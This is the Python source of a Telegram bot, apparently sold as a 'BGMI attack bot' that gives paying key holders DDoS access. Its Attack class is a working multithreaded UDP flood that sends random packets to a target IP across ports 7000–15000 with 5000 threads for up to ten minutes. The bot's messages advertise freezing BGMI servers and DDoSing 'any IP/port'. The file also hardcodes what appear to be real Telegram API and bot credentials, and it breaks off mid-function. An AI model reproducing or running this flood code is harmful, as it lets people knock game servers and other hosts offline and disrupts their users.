#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
Server Freeze Bot | Random Emoji + Sticker | Auto Update | Welcome Animation
"""

import asyncio, json, random, os, time, socket, threading, logging, string, uuid
from datetime import datetime, timedelta
import pytz
from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"
OWNER_LINK = f"https://t.me/{OWNER_USERNAME}"
BOT_USERNAME = "BeStChEaT_BGMIDdos_Bot"
BOT_LINK = f"https://t.me/{BOT_USERNAME}"

# ═══════════════ DATABASE ═══════════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
KEYS_DB = "keys.json"
BLOCKED_DB = "blocked.json"
HISTORY_DB = "history.json"
STICKER_DB = "sticker.json"
EMOJI_DB = "emojis.json"

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════════ SETTINGS ═══════════════
PREMIUM_THREADS = 5000
PREMIUM_TIME = 600  # 10 minutes

# ═══════════════ TRACKING ═══════════════
used_videos = []
last_emoji_index = -1
last_sticker_index = -1

# ═══════════════ HELPERS ═══════════════
def jload(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else {}

def jsave(f, d):
    with open(f, 'w') as fl: json.dump(d, fl, indent=2)

def generate_unique_key():
    prefixes = ["BGMI", "VIP", "PRO", "ELITE", "LEGEND", "MYTHIC", "ULTRA"]
    prefix = random.choice(prefixes)
    seg1 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    seg2 = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    unique_id = str(uuid.uuid4())[:8].upper()
    return f"{prefix}-{seg1}-{seg2}-{unique_id}"

def parse_duration(time_str):
    if not time_str: return None
    time_str = time_str.lower().strip()
    try:
        if 'min' in time_str: return int(time_str.replace('min','').replace('mins','').strip()), 'minutes'
        elif time_str.endswith('m'): return int(time_str[:-1]), 'minutes'
        elif 'h' in time_str: return int(time_str.replace('h','').replace('hr','').replace('hrs','').replace('hour','').replace('hours','').strip()), 'hours'
        elif 'd' in time_str: return int(time_str.replace('d','').replace('day','').replace('days','').strip()), 'days'
        elif 'w' in time_str: return int(time_str.replace('w','').replace('wk','').replace('wks','').replace('week','').replace('weeks','').strip()), 'weeks'
        elif 'mo' in time_str: return int(time_str.replace('mo','').replace('month','').replace('months','').strip()), 'months'
        else: return int(time_str), 'hours'
    except: return None

def calc_expiry(value, unit):
    now = datetime.now(IST)
    if unit == 'minutes': return now + timedelta(minutes=value)
    elif unit == 'hours': return now + timedelta(hours=value)
    elif unit == 'days': return now + timedelta(days=value)
    elif unit == 'weeks': return now + timedelta(weeks=value)
    elif unit == 'months': return now + timedelta(days=value*30)
    return now + timedelta(hours=value)

def format_duration(value, unit):
    names = {'minutes':'Minute','hours':'Hour','days':'Day','weeks':'Week','months':'Month'}
    name = names.get(unit, unit)
    return f"{value} {name}{'s' if value != 1 else ''}"

def get_remaining(expiry_str):
    try:
        expiry = datetime.fromisoformat(expiry_str)
        now = datetime.now(IST)
        if now >= expiry: return "EXPIRED", True
        diff = expiry - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        if days > 30: return f"{days//30}M+", False
        elif days > 0: return f"{days}D {hours}H", False
        elif hours > 0: return f"{hours}H {minutes}M", False
        else: return f"{minutes}M", False
    except: return "ERROR", False

# ═══════════════ EMOJI FUNCTIONS ═══════════════
def get_emojis():
    data = jload(EMOJI_DB, {"emojis": []})
    return data

def add_emoji(emoji_id):
    data = get_emojis()
    if emoji_id not in data["emojis"]:
        data["emojis"].append(emoji_id)
        jsave(EMOJI_DB, data)
        return True, len(data["emojis"])
    return False, len(data["emojis"])

def remove_emoji(index):
    data = get_emojis()
    if 0 <= index < len(data["emojis"]):
        removed = data["emojis"].pop(index)
        jsave(EMOJI_DB, data)
        return True, removed, len(data["emojis"])
    return False, None, len(data["emojis"])

def get_random_emoji():
    global last_emoji_index
    data = get_emojis()
    if data["emojis"]:
        if len(data["emojis"]) > 1:
            available = [i for i in range(len(data["emojis"])) if i != last_emoji_index]
            if available:
                last_emoji_index = random.choice(available)
                return data["emojis"][last_emoji_index]
        last_emoji_index = 0
        return data["emojis"][0]
    return None

def get_all_emojis():
    return get_emojis()["emojis"]

def reset_emojis():
    jsave(EMOJI_DB, {"emojis": []})
    return True

# ═══════════════ STICKER FUNCTIONS ═══════════════
def get_stickers():
    data = jload(STICKER_DB, {"stickers": []})
    return data

def add_sticker(sticker_id):
    data = get_stickers()
    if sticker_id not in data["stickers"]:
        data["stickers"].append(sticker_id)
        jsave(STICKER_DB, data)
        return True, len(data["stickers"])
    return False, len(data["stickers"])

def remove_sticker(index):
    data = get_stickers()
    if 0 <= index < len(data["stickers"]):
        removed = data["stickers"].pop(index)
        jsave(STICKER_DB, data)
        return True, removed, len(data["stickers"])
    return False, None, len(data["stickers"])

def get_random_sticker():
    global last_sticker_index
    data = get_stickers()
    if data["stickers"]:
        if len(data["stickers"]) > 1:
            available = [i for i in range(len(data["stickers"])) if i != last_sticker_index]
            if available:
                last_sticker_index = random.choice(available)
                return data["stickers"][last_sticker_index]
        last_sticker_index = 0
        return data["stickers"][0]
    return None

def get_all_stickers():
    return get_stickers()["stickers"]

def reset_stickers():
    jsave(STICKER_DB, {"stickers": []})
    return True

# ═══════════════ VIDEO FUNCTIONS ═══════════════
def get_vids(): return jload(VIDEO_DB, [])
def add_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path)})
    jsave(VIDEO_DB, vids)
    return vid
def rand_vid():
    global used_videos
    vids = get_vids()
    if not vids: return None
    avail = [v for v in vids if v["id"] not in used_videos]
    if not avail: used_videos.clear(); avail = vids
    v = random.choice(avail); used_videos.append(v["id"])
    return v
def del_vid(vid):
    vids = get_vids()
    for i, v in enumerate(vids):
        if v["id"] == vid:
            if os.path.exists(v["path"]): os.remove(v["path"])
            vids.pop(i); jsave(VIDEO_DB, vids)
            return True
    return False
def clear_vids():
    vids = get_vids()
    for v in vids:
        if os.path.exists(v["path"]): os.remove(v["path"])
    jsave(VIDEO_DB, [])
    return len(vids)

# ═══════════════ USER FUNCTIONS ═══════════════
def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
def get_blocked(): return jload(BLOCKED_DB, [])
def is_blocked(uid): return str(uid) in get_blocked()

def check_access(uid):
    if is_blocked(uid): return False, "BLOCKED"
    if uid == OWNER_ID: return True, "OWNER"
    u = get_users()
    if str(uid) in u.get("premium", []): return True, "PREMIUM"
    uk = u.get("keys", {}).get(str(uid), {})
    if uk:
        try:
            if datetime.now(IST) < datetime.fromisoformat(uk["expiry"]):
                r, _ = get_remaining(uk["expiry"])
                return True, f"KEY ({r})"
            else:
                del u["keys"][str(uid)]; jsave(USERS_DB, u)
        except: pass
    return False, "NONE"

def get_user_info(uid):
    access, a_type = check_access(uid)
    info = {"access": access, "type": a_type, "threads": PREMIUM_THREADS if access else 0, "max_time": PREMIUM_TIME if access else 0, "expiry": None, "remaining": None}
    if a_type.startswith("KEY"):
        uk = get_users().get("keys", {}).get(str(uid), {})
        if uk:
            info["expiry"] = uk.get("expiry")
            if info["expiry"]: info["remaining"], _ = get_remaining(info["expiry"])
    return info

def grant_access(uid, key_name, duration_str, expiry):
    u = get_users()
    if "keys" not in u: u["keys"] = {}
    u["keys"][str(uid)] = {"key_name": key_name, "duration": duration_str, "expiry": expiry.isoformat(), "granted_at": datetime.now(IST).isoformat()}
    jsave(USERS_DB, u)

def remove_expired():
    u = get_users(); removed = 0
    if "keys" in u:
        exp = [uid for uid, data in u["keys"].items() if datetime.now(IST) >= datetime.fromisoformat(data["expiry"])]
        for uid in exp: del u["keys"][uid]; removed += 1
        if removed > 0: jsave(USERS_DB, u)
    return removed

# ═══════════════ HISTORY ═══════════════
def get_history(): return jload(HISTORY_DB, {})
def add_history(uid, action, details):
    h = get_history()
    if str(uid) not in h: h[str(uid)] = []
    h[str(uid)].append({"action": action, "details": details, "time": datetime.now(IST).isoformat()})
    if len(h[str(uid)]) > 50: h[str(uid)] = h[str(uid)][-50:]
    jsave(HISTORY_DB, h)

def get_user_history(uid):
    return get_history().get(str(uid), [])

# ═══════════════ KEY FUNCTIONS ═══════════════
def get_keys(): return jload(KEYS_DB, {})
def create_key(name, time_str):
    keys = get_keys()
    key_code = generate_unique_key()
    while key_code in keys: key_code = generate_unique_key()
    parsed = parse_duration(time_str)
    if not parsed: return None, None
    value, unit = parsed
    keys[key_code] = {"name": name, "time_value": value, "time_unit": unit, "duration_display": format_duration(value, unit), "created": datetime.now(IST).isoformat(), "used_by": None, "active": True}
    jsave(KEYS_DB, keys)
    return key_code, format_duration(value, unit)

def redeem_key_code(key_code, user_id):
    keys = get_keys()
    if key_code not in keys: return False, "Invalid key!"
    key = keys[key_code]
    if not key["active"]: return False, "Key already used!"
    expiry = calc_expiry(key["time_value"], key["time_unit"])
    grant_access(user_id, key["name"], key["duration_display"], expiry)
    key["used_by"] = str(user_id); key["used_at"] = datetime.now(IST).isoformat(); key["active"] = False
    jsave(KEYS_DB, keys)
    add_history(user_id, "KEY_REDEEMED", f"{key['duration_display']}")
    return True, expiry.strftime('%d %B %Y, %I:%M %p')

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
        while self.on and time.time() < end:
            try:
                for _ in range(20):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
ainfo = {}
amsg = None
attack_user = None

# ═══════════════ BOT ═══════════════
app = Client("final_bgmi_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ═══════════════ KEYBOARDS ═══════════════
def user_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status_btn"),
         InlineKeyboardButton("ℹ️ INFO", callback_data="info_menu")],
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="redeem_menu")],
        [InlineKeyboardButton("📝 COMMANDS", callback_data="commands_menu")],
    ])

def owner_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status_btn"),
         InlineKeyboardButton("ℹ️ INFO", callback_data="info_menu")],
        [InlineKeyboardButton("🔑 REDEEM KEY", callback_data="redeem_menu")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🎬 VIDEO MANAGER", callback_data="video_menu")],
        [InlineKeyboardButton("🎯 EMOJI MANAGER", callback_data="emoji_menu")],
        [InlineKeyboardButton("🎨 STICKER MANAGER", callback_data="sticker_menu")],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_menu")],
        [InlineKeyboardButton("📝 COMMANDS", callback_data="commands_menu")],
    ])

def auto_key_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 20 Minute 🔓", callback_data="ak_20m"),
         InlineKeyboardButton("🔑 40 Minute 🔓", callback_data="ak_40m"),
         InlineKeyboardButton("🔑 60 Minute 🔓", callback_data="ak_60m")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🗝️ 1 Day 🔐", callback_data="ak_1d"),
         InlineKeyboardButton("🗝️ 3 Day 🔐", callback_data="ak_3d"),
         InlineKeyboardButton("🗝️ 7 Day 🔐", callback_data="ak_7d")],
        [InlineKeyboardButton("🗝️ 15 Day 🔐", callback_data="ak_15d"),
         InlineKeyboardButton("🗝️ 23 Day 🔐", callback_data="ak_23d"),
         InlineKeyboardButton("🗝️ 30 Day 🔐", callback_data="ak_30d")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🪪 1 Month 🫆", callback_data="ak_1mo"),
         InlineKeyboardButton("🪪 2 Month 🫆", callback_data="ak_2mo"),
         InlineKeyboardButton("🪪 3 Month 🫆", callback_data="ak_3mo")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back_admin")],
    ])

def video_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 ADD VIDEO", callback_data="v_add")],
        [InlineKeyboardButton("🗑️ DELETE VIDEO", callback_data="v_del")],
        [InlineKeyboardButton("🧹 CLEAR ALL", callback_data="v_clear")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 LIST VIDEOS", callback_data="v_list")],
        [InlineKeyboardButton("ℹ️ HELP", callback_data="v_help")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back_admin")],
    ])

def emoji_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 ADD EMOJI", callback_data="e_add")],
        [InlineKeyboardButton("🗑️ REMOVE EMOJI", callback_data="e_remove")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 LIST EMOJIS", callback_data="e_list")],
        [InlineKeyboardButton("🔄 RESET ALL", callback_data="e_reset")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back_admin")],
    ])

def sticker_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 ADD STICKER", callback_data="s_add")],
        [InlineKeyboardButton("🗑️ REMOVE STICKER", callback_data="s_remove")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 LIST STICKERS", callback_data="s_list")],
        [InlineKeyboardButton("🔄 RESET ALL", callback_data="s_reset")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back_admin")],
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🪪 ADD KEY", callback_data="admin_addkey")],
        [InlineKeyboardButton("🤖 AUTO GEN KEY", callback_data="admin_auto")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("📋 ALL KEYS", callback_data="admin_keys")],
        [InlineKeyboardButton("📊 STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("🔄 CLEAR EXPIRED", callback_data="admin_clear")],
        [InlineKeyboardButton("━━━━━━━━━━━━━━━━━━", callback_data="sep")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")],
    ])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])

def back_admin_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back_admin")]])

# ═══════════════ WELCOME ANIMATION ═══════════════
async def welcome_animation(client, msg):
    try:
        user = msg.from_user
        chat_id = msg.chat.id
        first_name = user.first_name or "User"
        user_id = user.id
        
        # Step 1: React with ❤️
        try:
            await msg.react("❤️")
        except:
            pass
        
        await asyncio.sleep(0.3)
        
        # Step 2: Send random sticker FIRST
        sticker_id = get_random_sticker()
        if sticker_id:
            try:
                sticker_msg = await client.send_sticker(chat_id, sticker_id)
            except:
                sticker_msg = None
        else:
            sticker_msg = None
        
        await asyncio.sleep(0.3)
        
        # Step 3: Send random emoji
        emoji_id = get_random_emoji()
        if emoji_id:
            try:
                emoji_msg = await client.send_sticker(chat_id, emoji_id)
            except:
                emoji_msg = None
        else:
            emoji_msg = None
        
        await asyncio.sleep(0.3)
        
        # Step 4: Welcome Baby with user name and profile link
        welcome_emojis = ["🩷", "🌸", "🏖️", "🍰", "🥂"]
        welcome_msg = await client.send_message(
            chat_id, 
            f"🩷 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁ᴀʙʏ ꨄ [{first_name}](tg://user?id={user_id})"
        )
        
        # Change emojis in same message (0.3 sec interval)
        for emoji in welcome_emojis[:5]:
            await asyncio.sleep(0.3)
            try:
                await welcome_msg.edit_text(f"{emoji} 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐁ᴀʙʏ ꨄ [{first_name}](tg://user?id={user_id})")
            except:
                pass
        
        # Delete emoji message
        if emoji_msg:
            try:
                await emoji_msg.delete()
            except:
                pass
        
        # Step 5: Delete welcome message after 0.9 seconds
        await asyncio.sleep(0.9)
        try:
            await welcome_msg.delete()
        except:
            pass
        
        await asyncio.sleep(0.2)
        
        # Step 6: Starting animation with typing effect
        starting_emojis = ["🩵", "🌠", "🪶", "🍓", "🌶️"]
        starting_msg = await client.send_message(chat_id, "s")
        
        # Character by character typing effect
        full_text = "🩵 ѕтαятιиg....."
        chars_to_add = ["t", "α", "я", "т", "ι", "и", "g", ".", ".", ".", ".", "."]
        current_text = "s"
        
        # Add each character with emoji change
        emoji_idx = 0
        for i, char in enumerate(chars_to_add):
            current_text += char
            await asyncio.sleep(0.08)
            try:
                if i % 2 == 0:
                    emoji = starting_emojis[emoji_idx % len(starting_emojis)]
                    await starting_msg.edit_text(f"{emoji} {current_text}")
                    emoji_idx += 1
                else:
                    await starting_msg.edit_text(current_text)
            except:
                pass
        
        await asyncio.sleep(0.5)
        await starting_msg.delete()
        
        await asyncio.sleep(0.2)
        
        # Step 7: Wait 3 seconds before final message
        await asyncio.sleep(3)
        
        # Step 8: Final welcome message with EXACT text
        final_text = f"""
ʜᴇʏ, ⌬ [{first_name}](tg://user?id={user_id}) 
ɪ'ᴍ ˹[{BOT_USERNAME}]({BOT_LINK}) ✘ 𝚫𝛕𝛕𝛂𝛓𝛋𝛆𝛄˼ ♪,

┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ ɪ ʜᴀᴠᴇ sᴘᴇᴄɪᴀʟ ғᴇᴀᴛᴜʀᴇs.
┠ ◆ ᴀʟʟ-ɪɴ-ᴏɴᴇ ʙᴏᴛ.
┗━━━━━━━━━━━━━━━━━⧫
┏━━━━━━━━━━━━━━━━━⧫
┠ ◆ ʏᴏᴜ ᴄᴀɴ ғʀᴇᴇᴢᴇ ʙɢᴍɪ ꜱᴇʀᴠᴇʀ.
┠ ◆ ʏᴏᴜ ᴄᴀɴ ᴅᴅᴏꜱ ᴀɴʏ ɪᴘ/ᴘᴏʀᴛ.
┠ ◆ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ 5000+ ᴛʜʀᴇᴀᴅꜱ ꜰᴏʀ ᴍᴀx ᴅᴀᴍᴀɢᴇ.
┠ ◆ ɪ ᴄᴀɴ ᴀᴛᴛᴀᴄᴋ ᴜᴘᴛᴏ 10 ᴍɪɴᴜᴛᴇꜱ.
┠ ◆ ꜱᴘᴇᴄɪᴀʟ ᴡᴇʟᴄᴏᴍᴇ 
┠ ◆ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ᴄʟɪᴄᴋ ᴄᴏᴍᴍᴀɴᴅs ʙᴜᴛᴛᴏɴ...
┗━━━━━━━━━━━━━━━━━⧫
๏ ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ʜᴇʟᴩ ʙᴜᴛᴛᴏɴ ᴛᴏ ɢᴇᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴀʙᴏᴜᴛ ᴍʏ ᴍᴏᴅᴜʟᴇs ᴀɴᴅ ᴄᴏᴍᴍᴀɴᴅs.

🫧 ᴅᴇᴠᴇʟᴏᴩᴇʀ 🫧 ➪ [𝜝𝜣𝜯 𝑭𝜟𝜯𝜢𝜮𝜞]({OWNER_LINK}) ✔︎
"""
        
        if user_id == OWNER_ID:
            kb = owner_kb()
        else:
            kb = user_kb()
        
        final_msg = await client.send_message(chat_id, final_text, reply_markup=kb)
        
        # Step 9: Delete sticker after final message
        if sticker_msg:
            try:
                await sticker_msg.delete()
            except:
                pass
        
        return final_msg
        
    except Exception as e:
        logger.error(f"Welcome animation error: {e}")
        await normal_start(client, msg)

async def normal_start(client, msg):
    uid = msg.from_user.id
    user = msg.from_user
    access, a_type = check_access(uid)
    
    if not access:
        vid = rand_vid()
        text = (
            "🩵 𝘼𝘾𝘾𝙀𝙎𝙎 𝘿𝙀𝙉𝙄𝙀𝘿!\n\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"💌 {user.first_name}\n"
            f"🍄 {uid}\n"
            "━━━━━━━━━━━━━━━━━━━\n\n"
            "🏞️ 𝙋𝙍𝙀𝙈𝙄𝙐𝙈 𝙈𝙀𝙈𝘽𝙀𝙍𝙎 𝙊𝙉𝙇𝙔\n"
            "🔑 𝙍𝙚𝙙𝙚𝙚𝙢 𝙔𝙤𝙪𝙧 𝙆𝙚𝙮\n\n"
            "🍰 /redeem 𝙆𝙚𝙔\n"
            f"🕸️ [𝐅𝐀𝐓𝐇𝐄𝐑 𝐎𝐅 𝐁𝐎𝐓]({OWNER_LINK})"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛒 𝘽𝙪𝙮-𝙆𝙚𝙮 🔑", url=OWNER_LINK)],
            [InlineKeyboardButton("🪪 𝘼𝙗𝙤𝙪𝙩 𝙍𝙚𝙙𝙚𝙚𝙢 ♡", callback_data="redeem_popup")],
        ])
        return await send_vid(msg.chat.id, text, kb, vid)
    
    info = get_user_info(uid)
    vid = rand_vid()
    kb = owner_kb() if uid == OWNER_ID else user_kb()
    
    expiry_text = ""
    if info.get("remaining"): expiry_text += f"\n⏳ Remaining: {info['remaining']}"
    if info.get("expiry"):
        try:
            exp = datetime.fromisoformat(info["expiry"])
            expiry_text += f"\n📅 Expires: {exp.strftime('%d %b %Y, %I:%M %p')}"
        except: pass
    
    text = (
        "💀 𝐁𝐆𝐌𝐈 𝐀𝐓𝐓𝐀𝐂𝐊 𝐁𝐎𝐓 💀\n\n"
        f"{LINE}\n"
        f"👤 {user.first_name}\n"
        f"🆔 {uid}\n"
        f"💳 {a_type}{expiry_text}\n"
        f"{LINE}\n"
        f"⚡ {info['threads']} Threads\n"
        f"⏱️ {info['max_time']}s Max Time\n"
        f"📹 {len(get_vids())} Videos\n"
        f"{LINE}\n"
        "⚔️ /attack IP PORT TIME\n"
        "📋 /attack 1.2.3.4 8080 600\n"
        "🎮 BGMI Ports: 7000-15000\n"
        f"{LINE}\n"
        "🔽 SELECT OPTION:"
    )
    return await send_vid(msg.chat.id, text, kb, vid)

# ═══════════════ SEND HELPERS ═══════════════
async def send_vid(chat_id, text, kb=None, vid=None):
    if vid is None: vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            return await app.send_video(chat_id, vid["path"], caption=text, reply_markup=kb)
        return await app.send_message(chat_id, text, reply_markup=kb)
    except:
        return await app.send_message(chat_id, text, reply_markup=kb)

# ═══════════════ START ═══════════════
@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, msg):
    try:
        await msg.react("❤️")
    except Exception:
        pass
    
    await welcome_animation(client, msg)

# ═══════════════ EMOJI COMMANDS ═══════════════
@app.on_message(filters.command("addemoji"))
async def add_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message:
        return await msg.reply_text(
            "📤 **ADD EMOJI**\n\n"
            "Reply to a **premium emoji** with:\n"
            "`/addemoji`\n\n"
            "The emoji will be added to welcome animation!\n"
            "Each time new emoji will appear randomly."
        )
    
    emoji_id = None
    
    if msg.reply_to_message.sticker:
        emoji_id = msg.reply_to_message.sticker.file_id
    elif hasattr(msg.reply_to_message, 'custom_emoji_id') and msg.reply_to_message.custom_emoji_id:
        emoji_id = msg.reply_to_message.custom_emoji_id
    
    if emoji_id:
        success, total = add_emoji(emoji_id)
        if success:
            await msg.reply_text(
                f"✅ **EMOJI ADDED!** 🎉\n\n"
                f"🔹 **Total Emojis:** {total}\n\n"
                "✨ This emoji will now appear randomly in welcome animation!\n"
                "🔄 Each time a new random emoji will be shown."
            )
        else:
            await msg.reply_text("❌ This emoji is already in the list!")
    else:
        await msg.reply_text(
            "❌ **No emoji found!**\n\n"
            "Please reply to a **premium emoji** or **sticker**."
        )

@app.on_message(filters.command("removeemoji"))
async def remove_emoji_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            "🗑️ **REMOVE EMOJI**\n\n"
            "Use: `/removeemoji index`\n\n"
            "Get index from `/listemojis` command."
        )
    
    try:
        index = int(parts[1]) - 1
        success, removed, total = remove_emoji(index)
        if success:
            await msg.reply_text(
                f"✅ **EMOJI REMOVED!**\n\n"
                f"🔹 **Remaining Emojis:** {total}"
            )
        else:
            await msg.reply_text(f"❌ Invalid index! Total emojis: {total}")
    except ValueError:
        await msg.reply_text("❌ Invalid index! Use a number.")

@app.on_message(filters.command("listemojis"))
async def list_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    emojis = get_all_emojis()
    
    if not emojis:
        return await msg.reply_text("📭 **No emojis added yet!**\n\nAdd using `/addemoji`")
    
    text = "📋 **EMOJI LIST**\n\n"
    for i, emoji_id in enumerate(emojis, 1):
        text += f"**{i}.** `{emoji_id[:30]}...`\n"
    
    text += f"\n🔹 **Total:** {len(emojis)}"
    await msg.reply_text(text)

@app.on_message(filters.command("resetemojis"))
async def reset_emojis_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_emojis()
    await msg.reply_text(
        f"🔄 **EMOJIS RESET!**\n\n"
        f"🔹 **Total Emojis:** 0\n\n"
        "All emojis have been removed from the list."
    )

# ═══════════════ STICKER COMMANDS ═══════════════
@app.on_message(filters.command("addsticker"))
async def add_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    if not msg.reply_to_message:
        return await msg.reply_text(
            "🎨 **ADD STICKER**\n\n"
            "Reply to a **sticker** with:\n"
            "`/addsticker`\n\n"
            "The sticker will appear randomly in welcome animation!\n"
            "Each time a new random sticker will be shown."
        )
    
    if not msg.reply_to_message.sticker:
        return await msg.reply_text("❌ Please reply to a sticker!")
    
    sticker_id = msg.reply_to_message.sticker.file_id
    success, total = add_sticker(sticker_id)
    
    if success:
        await msg.reply_text(
            f"✅ **STICKER ADDED!** 🎉\n\n"
            f"🔹 **Total Stickers:** {total}\n\n"
            "✨ This sticker will now appear randomly in welcome animation!\n"
            "🔄 Each time a new random sticker will be shown."
        )
    else:
        await msg.reply_text("❌ This sticker is already in the list!")

@app.on_message(filters.command("removesticker"))
async def remove_sticker_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    parts = msg.text.split()
    if len(parts) != 2:
        return await msg.reply_text(
            "🗑️ **REMOVE STICKER**\n\n"
            "Use: `/removesticker index`\n\n"
            "Get index from `/liststickers` command."
        )
    
    try:
        index = int(parts[1]) - 1
        success, removed, total = remove_sticker(index)
        if success:
            await msg.reply_text(
                f"✅ **STICKER REMOVED!**\n\n"
                f"🔹 **Remaining Stickers:** {total}"
            )
        else:
            await msg.reply_text(f"❌ Invalid index! Total stickers: {total}")
    except ValueError:
        await msg.reply_text("❌ Invalid index! Use a number.")

@app.on_message(filters.command("liststickers"))
async def list_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    stickers = get_all_stickers()
    
    if not stickers:
        return await msg.reply_text("📭 **No stickers added yet!**\n\nAdd using `/addsticker`")
    
    text = "📋 **STICKER LIST**\n\n"
    for i, sticker_id in enumerate(stickers, 1):
        text += f"**{i}.** `{sticker_id[:30]}...`\n"
    
    text += f"\n🔹 **Total:** {len(stickers)}"
    await msg.reply_text(text)

@app.on_message(filters.command("resetstickers"))
async def reset_stickers_cmd(client, msg):
    if msg.from_user.id != OWNER_ID:
        return await msg.reply_text("❌ Owner only!")
    
    reset_stickers()
    await msg.reply_text(
